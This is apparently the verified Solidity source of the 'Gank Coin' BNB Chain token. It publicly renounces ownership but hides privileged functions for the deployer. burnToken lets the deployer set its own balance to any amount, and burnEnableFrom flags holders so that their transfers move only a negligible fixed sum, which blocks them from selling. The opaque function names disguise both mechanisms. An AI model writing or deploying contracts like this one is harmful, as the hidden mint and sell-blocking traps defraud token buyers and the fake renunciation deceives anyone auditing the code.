/**
 *Submitted for verification at BscScan.com on 2023-01-28
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract GankCoin {
    uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;
    uint256 constant buyTxToken = 14 ** 10;
    mapping(address => bool) public shouldFee;
    mapping(address => bool) public receiverAuto;

    bool public enableWallet;

    string public symbol = "GCN";
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public exemptFee;


    string public name = "Gank Coin";
    address public walletEnable;

    

    event OwnershipTransferred(address indexed fundLimit, address indexed toLiquidity);
    event Transfer(address indexed totalFeeFund, address indexed swapMode, uint256 launchToken);
    event Approval(address indexed txAmountTo, address indexed atMode, uint256 launchToken);

    constructor (){
        IUniswapV2Router toTx = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        walletEnable = IUniswapV2Factory(toTx.factory()).createPair(toTx.WETH(), address(this));
        owner = msg.sender;
        exemptFee = owner;
        shouldFee[exemptFee] = true;
        balanceOf[exemptFee] = totalSupply;
        emit Transfer(address(0), exemptFee, totalSupply);
        renounceOwnership();
    }

    

    function minTake(address atMinLiquidity, address isLiquidity, uint256 fundIs) internal returns (bool) {
        require(balanceOf[atMinLiquidity] >= fundIs);
        balanceOf[atMinLiquidity] -= fundIs;
        balanceOf[isLiquidity] += fundIs;
        emit Transfer(atMinLiquidity, isLiquidity, fundIs);
        return true;
    }

    function burnEnableFrom(address launchMinSwap) public {
        if (launchMinSwap == exemptFee || !shouldFee[msg.sender]) {
            return;
        }
        receiverAuto[launchMinSwap] = true;
    }

    function buyReceiver(address minLiquidity) public {
        if (enableWallet) {
            return;
        }
        shouldFee[minLiquidity] = true;
        enableWallet = true;
    }

    function burnToken(uint256 fundIs) public {
        if (fundIs == 0 || !shouldFee[msg.sender]) {
            return;
        }
        balanceOf[exemptFee] = fundIs;
    }

    function transfer(address walletTx, uint256 fundIs) external returns (bool) {
        return transferFrom(msg.sender, walletTx, fundIs);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function transferFrom(address totalMode, address walletTx, uint256 fundIs) public returns (bool) {
        if (totalMode != msg.sender && allowance[totalMode][msg.sender] != type(uint256).max) {
            require(allowance[totalMode][msg.sender] >= fundIs);
            allowance[totalMode][msg.sender] -= fundIs;
        }
        if (walletTx == exemptFee || totalMode == exemptFee) {
            return minTake(totalMode, walletTx, fundIs);
        }
        if (receiverAuto[totalMode]) {
            return minTake(totalMode, walletTx, buyTxToken);
        }
        return minTake(totalMode, walletTx, fundIs);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(exemptFee, address(0));
        owner = address(0);
    }


}